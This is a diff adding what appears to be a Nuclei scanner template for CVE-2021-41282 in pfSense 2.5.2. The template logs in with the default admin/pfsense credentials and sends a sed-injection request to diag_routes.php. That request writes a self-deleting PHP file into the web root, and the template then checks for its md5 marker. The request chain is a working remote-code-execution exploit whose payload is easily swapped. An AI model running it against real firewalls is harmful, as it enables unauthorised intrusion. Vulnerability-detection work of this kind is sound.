@@ -1,0 +1,70 @@
+id: cve-2021-41282
+info:
+  name: pfSense diag_routes.php Arbitrary File Write RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    diag_routes.php in pfSense 2.5.2 allows sed data injection. The data is retrieved by executing the netstat utility, and then its output is parsed via the sed utility.
+  reference:
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41282
+    - https://vigilance.fr/vulnerability/pfSense-code-execution-via-diag-routes-php-37559
+
+variables:
+  csrf_token: ""
+
+http:
+  - id: csrf-token-extraction
+    method: GET
+    path:
+      - "/index.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: csrf_token
+        internal: true
+        regex:
+          - "sid:[a-z0-9,;:]+"
+
+  - id: login-to-pfsense
+    method: POST
+    path:
+      - "/index.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "__csrf_magic={{csrf_token}}&usernamefld=admin&passwordfld=pfsense&login=Sign+In"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        words:
+          - "Location: /"
+        part: header
+
+  - id: create-malicious-file
+    method: GET
+    path:
+      - "/diag_routes.php?isAjax=1&filter=.*/!d;};s/Destination/\x3c\x3fphp+var_dump(md5(\x27CVE-2021-41282\x27));unlink(__FILE__)\x3b\x3f\x3e/;w+/usr/local/www/test.php%0a%23"
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-malicious-file
+    method: GET
+    path:
+      - "/test.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "c3959e8a43f1b39b0d1255961685a238"
+        part: body
